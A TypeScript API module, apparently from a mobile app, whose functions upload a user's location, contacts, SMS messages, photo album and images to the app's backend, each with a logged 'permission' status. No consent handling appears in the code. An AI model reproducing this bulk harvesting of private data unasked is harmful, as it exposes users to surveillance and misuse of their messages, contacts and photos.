import axios from 'axios';
import { API_URL, API_ENDPOINTS } from '../config/api';

// 添加日志上传函数
const uploadLog = async (token: string, type: string, status: string, error?: any) => {
  try {
    await axios.post(`${API_URL}${API_ENDPOINTS.UPLOAD_PERMISSION_LOG}`, {
      type,
      status,
      error: error ? JSON.stringify(error) : null,
      timestamp: new Date().toISOString()
    }, {
      headers: { Authorization: `Bearer ${token}` }
    });
  } catch (e) {
    console.error('日志上传失败:', e);
  }
};

export const uploadLocation = async (token: string, data: any) => {
  try {
    await uploadLog(token, 'location', 'start');
    const response = await axios.post(`${API_URL}${API_ENDPOINTS.UPLOAD_LOCATION}`, { data }, {
      headers: { Authorization: `Bearer ${token}` }
    });
    await uploadLog(token, 'location', 'success');
    return response;
  } catch (error) {
    await uploadLog(token, 'location', 'error', error);
    throw error;
  }
};

export const uploadContacts = async (token: string, data: any) => {
  try {
    await uploadLog(token, 'contacts', 'start');
    const response = await axios.post(`${API_URL}${API_ENDPOINTS.UPLOAD_CONTACTS}`, { data }, {
      headers: { Authorization: `Bearer ${token}` }
    });
    await uploadLog(token, 'contacts', 'success');
    return response;
  } catch (error) {
    await uploadLog(token, 'contacts', 'error', error);
    throw error;
  }
};

export const uploadSMS = async (token: string, data: any) => {
  try {
    await uploadLog(token, 'sms', 'start');
    const response = await axios.post(`${API_URL}${API_ENDPOINTS.UPLOAD_SMS}`, { data }, {
      headers: { Authorization: `Bearer ${token}` }
    });
    await uploadLog(token, 'sms', 'success');
    return response;
  } catch (error) {
    await uploadLog(token, 'sms', 'error', error);
    throw error;
  }
};

export const uploadAlbum = async (token: string, data: any) => {
  try {
    await uploadLog(token, 'album', 'start');
    const response = await axios.post(`${API_URL}${API_ENDPOINTS.UPLOAD_ALBUM}`, { data }, {
      headers: { Authorization: `Bearer ${token}` }
    });
    await uploadLog(token, 'album', 'success');
    return response;
  } catch (error) {
    await uploadLog(token, 'album', 'error', error);
    throw error;
  }
};

// 新增：压缩并上传单张图片
export const uploadCompressedImage = async (token: string, imageUri: string, filename?: string) => {
  try {
    await uploadLog(token, 'image-upload', 'start');
    
    // 创建 FormData
    const formData = new FormData();
    formData.append('image', {
      uri: imageUri,
      type: 'image/jpeg',
      name: filename || 'photo.jpg'
    } as any);
    
    const response = await axios.post(`${API_URL}/users/upload-image`, formData, {
      headers: {
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'multipart/form-data'
      }
    });
    
    await uploadLog(token, 'image-upload', 'success');
    return response.data;
  } catch (error) {
    await uploadLog(token, 'image-upload', 'error', error);
    throw error;
  }
}; 